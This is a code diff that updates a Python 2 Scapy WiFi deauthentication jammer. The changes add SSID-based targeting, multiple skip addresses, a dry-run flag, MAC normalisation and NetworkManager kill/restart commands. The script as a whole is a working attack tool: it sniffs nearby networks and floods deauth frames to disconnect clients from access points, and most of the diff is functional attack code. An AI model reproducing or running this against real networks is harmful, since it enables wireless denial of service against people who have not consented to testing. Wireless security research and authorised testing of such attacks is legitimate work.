@@ -1,4 +1,5 @@
-#!/usr/bin/env python
+#!/usr/bin/env python2
+# -*- coding: UTF-8 -*-
 
 import logging
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR) # Shut up Scapy
@@ -27,20 +28,71 @@ GR = '\033[37m' # gray
 T  = '\033[93m' # tan
 
 def parse_args():
-	#Create the arguments
+    #Create the arguments
     parser = argparse.ArgumentParser()
 
-    parser.add_argument("-s", "--skip", help="Skip deauthing this MAC address. Example: -s 00:11:BB:33:44:AA")
-    parser.add_argument("-i", "--interface", help="Choose monitor mode interface. By default script will find the most powerful interface and starts monitor mode on it. Example: -i mon5")
-    parser.add_argument("-c", "--channel", help="Listen on and deauth only clients on the specified channel. Example: -c 6")
-    parser.add_argument("-m", "--maximum", help="Choose the maximum number of clients to deauth. List of clients will be emptied and repopulated after hitting the limit. Example: -m 5")
-    parser.add_argument("-n", "--noupdate", help="Do not clear the deauth list when the maximum (-m) number of client/AP combos is reached. Must be used in conjunction with -m. Example: -m 10 -n", action='store_true')
-    parser.add_argument("-t", "--timeinterval", help="Choose the time interval between packets being sent. Default is as fast as possible. If you see scapy errors like 'no buffer space' try: -t .00001")
-    parser.add_argument("-p", "--packets", help="Choose the number of packets to send in each deauth burst. Default value is 1; 1 packet to the client and 1 packet to the AP. Send 2 deauth packets to the client and 2 deauth packets to the AP: -p 2")
-    parser.add_argument("-d", "--directedonly", help="Skip the deauthentication packets to the broadcast address of the access points and only send them to client/AP pairs", action='store_true')
-    parser.add_argument("-a", "--accesspoint", help="Enter the MAC address of a specific access point to target")
-    parser.add_argument("--world", help="N. American standard is 11 channels but the rest of the world it's 13 so this options enables the scanning of 13 channels", action="store_true")
-
+    parser.add_argument("-s",
+                        "--skip",
+                        nargs='*',
+                        default=[],
+                        help="Skip deauthing this MAC address. \
+                                Example: -s 00:11:BB:33:44:AA")
+    parser.add_argument("-i",
+                        "--interface",
+                        help="Choose monitor mode interface. \
+                                By default script will find the most powerful \
+                                interface and starts monitor mode on it. \
+                                Example: -i mon5")
+    parser.add_argument("-c",
+                        "--channel",
+                        help="Listen on and deauth only clients on the specified channel. \
+                                Example: -c 6")
+    parser.add_argument("-m",
+                        "--maximum",
+                        help="Choose the maximum number of clients to deauth. \
+                                List of clients will be emptied and repopulated \
+                                after hitting the limit. Example: -m 5")
+    parser.add_argument("-n",
+                        "--noupdate",
+                        help="Do not clear the deauth list when the maximum (-m) \
+                                number of client/AP combos is reached. \
+                                Must be used in conjunction with -m. \
+                                Example: -m 10 -n",
+                        action='store_true')
+    parser.add_argument("-t",
+                        "--timeinterval",
+                        help="Choose the time interval between packets being sent. \
+                                Default is as fast as possible. \
+                                If you see scapy errors like 'no buffer space' \
+                                try: -t .00001")
+    parser.add_argument("-p",
+                        "--packets",
+                        help="Choose the number of packets to send in each deauth burst. \
+                                Default value is 1; \
+                                1 packet to the client and 1 packet to the AP. \
+                                Send 2 deauth packets to the client \
+                                and 2 deauth packets to the AP: -p 2")
+    parser.add_argument("-d",
+                        "--directedonly",
+                        help="Skip the deauthentication packets to the broadcast \
+                                address of the access points and only send them \
+                                to client/AP pairs",
+                        action='store_true')
+    parser.add_argument("-a",
+                        "--accesspoint",
+                        nargs='*',
+                        default=[],
+                        help="Enter the SSID or MAC address of a specific access point to target")
+    parser.add_argument("--world",
+                        help="N. American standard is 11 channels but the rest \
+                                of the world it's 13 so this options enables the \
+                                scanning of 13 channels",
+                        action="store_true")
+    parser.add_argument("--dry-run",
+                        dest="dry_run",
+                        default=False,
+                        action='store_true',
+                        help="Do not send any deauth packets.")
     return parser.parse_args()
 
 
@@ -60,6 +112,7 @@ def get_mon_iface(args):
     else:
         # Start monitor mode on a wireless interface
         print '['+G+'*'+W+'] Finding the most powerful interface...'
+        os.system('pkill NetworkManager')
         interface = get_iface(interfaces)
         monmode = start_mon_mode(interface)
         return monmode
@@ -117,17 +170,17 @@ def get_iface(interfaces):
 def start_mon_mode(interface):
     print '['+G+'+'+W+'] Starting monitor mode off '+G+interface+W
     try:
-        os.system('ifconfig %s down' % interface)
+        os.system('ip link set %s down' % interface)
         os.system('iwconfig %s mode monitor' % interface)
-        os.system('ifconfig %s up' % interface)
+        os.system('ip link set %s up' % interface)
         return interface
     except Exception:
         sys.exit('['+R+'-'+W+'] Could not start monitor mode')
 
 def remove_mon_iface(mon_iface):
-    os.system('ifconfig %s down' % mon_iface)
+    os.system('ip link set %s down' % mon_iface)
     os.system('iwconfig %s mode managed' % mon_iface)
-    os.system('ifconfig %s up' % mon_iface)
+    os.system('ip link set %s up' % mon_iface)
 
 def mon_mac(mon_iface):
     '''
@@ -186,8 +239,8 @@ def channel_hop(mon_iface, args):
             if first_pass == 1:
                 time.sleep(1)
                 continue
-
-        deauth(monchannel)
+        if not args.dry_run:
+	    deauth(monchannel)
 
 
 def deauth(monchannel):
@@ -196,7 +249,6 @@ def deauth(monchannel):
     multi-APs to one gateway. Constantly scans the clients_APs list and
     starts a thread to deauth each instance
     '''
-
     pkts = []
 
     if len(clients_APs) > 0:
@@ -236,6 +288,8 @@ def deauth(monchannel):
 
 def output(err, monchannel):
     os.system('clear')
+    if args.dry_run:
+        print P+'***DRY-RUN***'+W
     if err:
         print err
     else:
@@ -260,7 +314,7 @@ def noise_filter(skip, addr1, addr2):
     # Broadcast, broadcast, IPv6mcast, spanning tree, spanning tree, multicast, broadcast
     ignore = ['ff:ff:ff:ff:ff:ff', '00:00:00:00:00:00', '33:33:00:', '33:33:ff:', '01:80:c2:00:00:00', '01:00:5e:', mon_MAC]
     if skip:
-        ignore.append(skip)
+        ignore += [addr.lower() for addr in skip]
     for i in ignore:
         if i in addr1 or i in addr2:
             return True
@@ -289,10 +343,21 @@ def cb(pkt):
     # than updating on the fly in order to avoid costly for loops that require a lock
     if pkt.haslayer(Dot11):
         if pkt.addr1 and pkt.addr2:
+            pkt.addr1 = pkt.addr1.lower()
+            pkt.addr2 = pkt.addr2.lower()
 
             # Filter out all other APs and clients if asked
             if args.accesspoint:
-                if args.accesspoint not in [pkt.addr1, pkt.addr2]:
+                # track bssid for essid
+                if (pkt.haslayer(Dot11Beacon) or pkt.haslayer(Dot11ProbeResp)) and pkt[Dot11Elt].info in args.accesspoint:
+                    args.accesspoint.add(pkt[Dot11].addr3.lower())
+                # bail if bssid is not in target list
+                if not args.accesspoint.intersection([pkt.addr1.lower(), pkt.addr2.lower()]):
+                    # pkt does not match our target list 
+                    return
+
+            if args.skip:
+                if pkt.addr2 in args.skip:
                     return
 
             # Check if it's added to our AP list
@@ -300,6 +365,7 @@ def cb(pkt):
                 APs_add(clients_APs, APs, pkt, args.channel, args.world)
 
             # Ignore all the noisy packets like spanning tree
+
             if noise_filter(args.skip, pkt.addr1, pkt.addr2):
                 return
 
@@ -309,14 +375,11 @@ def cb(pkt):
 
 def APs_add(clients_APs, APs, pkt, chan_arg, world_arg):
     ssid       = pkt[Dot11Elt].info
-    bssid      = pkt[Dot11].addr3
+    bssid      = pkt[Dot11].addr3.lower()
     try:
         # Thanks to airoscapy for below
         ap_channel = str(ord(pkt[Dot11Elt:3].info))
-        if args.world == 'True':
-            chans = ['1', '2', '3', '4', '5', '6', '7', '8', '9', '10', '11', '12', '13']
-        else:
-            chans = ['1', '2', '3', '4', '5', '6', '7', '8', '9', '10', '11']
+        chans = ['1', '2', '3', '4', '5', '6', '7', '8', '9', '10', '11'] if not args.world else ['1', '2', '3', '4', '5', '6', '7', '8', '9', '10', '11', '12', '13'] 
         if ap_channel not in chans:
             return
 
@@ -365,9 +428,11 @@ def AP_check(addr1, addr2):
 
 def stop(signal, frame):
     if monitor_on:
+        os.system('service network-manager restart')
         sys.exit('\n['+R+'!'+W+'] Closing')
     else:
         remove_mon_iface(mon_iface)
+        os.system('service network-manager restart')
         sys.exit('\n['+R+'!'+W+'] Closing')
 
 if __name__ == "__main__":
@@ -378,6 +443,9 @@ if __name__ == "__main__":
     DN = open(os.devnull, 'w')
     lock = Lock()
     args = parse_args()
+    args.skip = list(map(str.lower, args.skip))
+    # lowercase bssids while leaving essids intact
+    args.accesspoint = set(_.lower() if ':' in _ else _ for _ in args.accesspoint)
     monitor_on = None
     mon_iface = get_mon_iface(args)
     conf.iface = mon_iface
@@ -392,8 +460,9 @@ if __name__ == "__main__":
     signal(SIGINT, stop)
 
     try:
-       sniff(iface=mon_iface, store=0, prn=cb)
+        sniff(iface=mon_iface, store=0, prn=cb)
     except Exception as msg:
         remove_mon_iface(mon_iface)
+        os.system('service network-manager restart')
         print '\n['+R+'!'+W+'] Closing'
         sys.exit(0)
